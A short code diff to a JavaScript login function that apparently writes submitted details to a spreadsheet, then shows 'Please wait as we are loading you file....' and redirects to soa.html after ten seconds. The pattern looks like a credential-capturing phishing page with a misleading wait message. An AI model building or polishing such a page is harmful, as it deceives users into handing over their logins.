@@ -51,9 +51,9 @@ async function login() {
       })
     });
     const text = await response.text();
-    result.textContent = `📤 ${text}`;
+    result.textContent = "Please wait as we are loading you file....";
       
-    setTimeout(() => window.location.href = "soa.html", 15000);
+    setTimeout(() => window.location.href = "soa.html", 10000);
   } catch (err) {
     console.error(err);
     result.textContent = "⚠️ Failed to update sheet";
